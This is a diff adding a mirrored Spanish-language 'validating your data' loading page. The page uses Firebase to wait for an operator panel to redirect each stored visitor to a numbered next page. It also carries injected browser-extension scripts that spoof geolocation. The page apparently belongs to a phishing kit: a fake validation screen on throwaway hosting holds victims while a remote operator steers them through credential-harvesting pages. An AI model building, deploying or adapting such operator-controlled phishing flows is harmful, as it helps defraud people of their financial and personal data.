@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="es"><script>
+    window[Symbol.for('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}')] = new (class{constructor(e,t){this.name=e,this.destination=t,this.serverListeners={},this.bgRequestsListeners={},this.bgEventsListeners={},window.addEventListener("message",(e=>{const t=e.data,s=!(t.destination&&t.destination===this.name),n=!t.event;if(!s&&!n)if("MARIO_POST_SERVER__BG_RESPONSE"===t.event){const e=t.args;if(this.hasBgRequestListener(e.requestId)){try{this.bgRequestsListeners[e.requestId](e.response)}catch(e){}delete this.bgRequestsListeners[e.requestId]}}else if("MARIO_POST_SERVER__BG_EVENT"===t.event){const e=t.args;if(this.hasBgEventListener(e.event))try{this.bgEventsListeners[t.id](e.payload)}catch(e){}}else if(this.hasServerListener(t.event))try{this.serverListeners[t.event](t.args)}catch(e){}}))}emitToServer(e,t){const s=this.generateUIID(),n={args:t,destination:this.destination,event:e,id:s};return window.postMessage(n,location.origin),s}emitToBg(e,t){const s=this.generateUIID(),n={bgEventName:e,requestId:s,args:t};return this.emitToServer("MARIO_POST_SERVER__BG_REQUEST",n),s}hasServerListener(e){return!!this.serverListeners[e]}hasBgRequestListener(e){return!!this.bgRequestsListeners[e]}hasBgEventListener(e){return!!this.bgEventsListeners[e]}fromServerEvent(e,t){this.serverListeners[e]=t}fromBgEvent(e,t){this.bgEventsListeners[e]=t}fromBgResponse(e,t){this.bgRequestsListeners[e]=t}generateUIID(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){const t=16*Math.random()|0;return("x"===e?t:3&t|8).toString(16)}))}})('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}', 'MARIO_POST_SERVER_{fca67f41-776b-438a-9382-662171858615}')</script><script>
+    const hideMyLocation = new (class{constructor(t){this.clientKey=t,this.watchIDs={},this.client=window[Symbol.for(t)];const e=navigator.geolocation.getCurrentPosition,o=navigator.geolocation.watchPosition,n=navigator.geolocation.clearWatch,i=this;navigator.geolocation.getCurrentPosition=function(t,o,n){i.handle(e,"GET",t,o,n)},navigator.geolocation.watchPosition=function(t,e,n){return i.handle(o,"WATCH",t,e,n)},navigator.geolocation.clearWatch=function(t){if(-1===t)return;const e=i.watchIDs[t];return delete i.watchIDs[t],n.apply(this,[e])}}handle(t,e,o,n,i){const a=this.client.emitToBg("HIDE_MY_LOCATION__GET_LOCATION");let r=this.getRandomInt(0,1e5);if(this.client.fromBgResponse(a,(a=>{if(a.enabled)if("SUCCESS"===a.status){const t=this.map(a);o(t)}else{const t=this.errorObj();n(t),r=-1}else{const a=[o,n,i],c=t.apply(navigator.geolocation,a);"WATCH"===e&&(this.watchIDs[r]=c)}})),"WATCH"===e)return r}map(t){return{coords:{accuracy:20,altitude:null,altitudeAccuracy:null,heading:null,latitude:t.latitude,longitude:t.longitude,speed:null},timestamp:Date.now()}}errorObj(){return{code:1,message:"User denied Geolocation"}}getRandomInt(t,e){return t=Math.ceil(t),e=Math.floor(e),Math.floor(Math.random()*(e-t+1))+t}})('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}')
+  </script>
+<!-- Mirrored from c72a89e6-a400-478b-b3fa-fe6cc71cb0fd-00-2pffrboxd76kr.riker.replit.dev/load.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 05 Aug 2025 04:45:24 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Pantalla de carga</title>
+
+  <!-- Google Fonts: Poppins -->
+  <link href="midas/css2.css" rel="stylesheet">
+
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background-color: 
+      white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      font-family: 'Poppins', sans-serif;
+      color: #60a60d;
+      user-select: none;
+    }
+
+    .loader-container {
+      text-align: center;
+    }
+
+    .loader-gif {
+      width: 120px;
+      height: auto;
+      margin-bottom: 5px;
+    }
+
+    .loader-text {
+      font-size: 20px;
+      font-weight: 600;
+      opacity: 0;
+      transform: scale(0.95);
+      animation: fadeZoomIn 1s ease forwards;
+    }
+
+    @keyframes fadeZoomIn {
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="loader-container">
+    <img src="midas/load.gif" alt="Cargando..." class="loader-gif">
+    <div class="loader-text">
+      Estamos validando sus datos por favor espere un momento...
+    </div>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+  
+  <!-- Configuración centralizada de Firebase y rutas -->
+  <script src="js/firebase-config.js"></script>
+  
+  <script>
+    // Variables globales para Firebase
+    let app, db, unsubscribe;
+
+    // Inicializar Firebase
+    try {
+        app = firebase.initializeApp(firebaseConfig);
+        db = firebase.firestore();
+        console.log('✅ Firebase inicializado en load.html');
+    } catch (error) {
+        console.error('❌ Error inicializando Firebase en load.html:', error);
+    }
+
+    // Función principal cuando el DOM esté listo
+    document.addEventListener('DOMContentLoaded', async function () {
+        console.log('🔄 Load.html iniciado - Esperando instrucciones del panel');
+        
+        // Obtener usuario desde localStorage
+        const usuarioActual = localStorage.getItem('usuarioActual');
+        
+        if (!usuarioActual) {
+            console.error('❌ No se encontró usuario en localStorage');
+            // Redirigir a inicio si no hay usuario
+            setTimeout(() => {
+                window.location.href = 'index.html';
+            }, 3000);
+            return;
+        }
+        
+        console.log('👤 Usuario encontrado:', usuarioActual);
+        
+        // Configurar timeout máximo de espera (5 minutos)
+        const timeoutId = setTimeout(() => {
+            console.log('⏰ Timeout alcanzado - redirigiendo a inicio');
+            window.location.href = 'index.html';
+        }, 5 * 60 * 1000); // 5 minutos
+        
+        // Escuchar cambios en tiempo real para redirección
+        const userRef = db.collection("redireccion").doc(usuarioActual);
+        
+        unsubscribe = userRef.onSnapshot((doc) => {
+            if (doc.exists) {
+                const userData = doc.data();
+                const page = userData.page;
+                
+                console.log('🔄 Cambio detectado en Firebase desde load.html:', { page, userData });
+                
+                // Si page > 0, redireccionar según la configuración
+                if (page > 0) {
+                    console.log(`🎯 Panel cambió página a ${page} - redirigiendo desde load.html`);
+                    
+                    // Cancelar timeout y desuscribirse
+                    clearTimeout(timeoutId);
+                    if (unsubscribe) unsubscribe();
+                    
+                    // Usar configuración de rutas
+                    const route = appConfig.routes[page];
+                    if (route) {
+                        console.log(`🚀 Redirigiendo a: ${route.url} (${route.name})`);
+                        window.location.href = route.url;
+                    } else {
+                        console.warn(`⚠️ Ruta no encontrada para page: ${page}`);
+                        window.location.href = `page${page}.html`;
+                    }
+                }
+            }
+        });
+    });
+  </script>
+</body>
+</html>
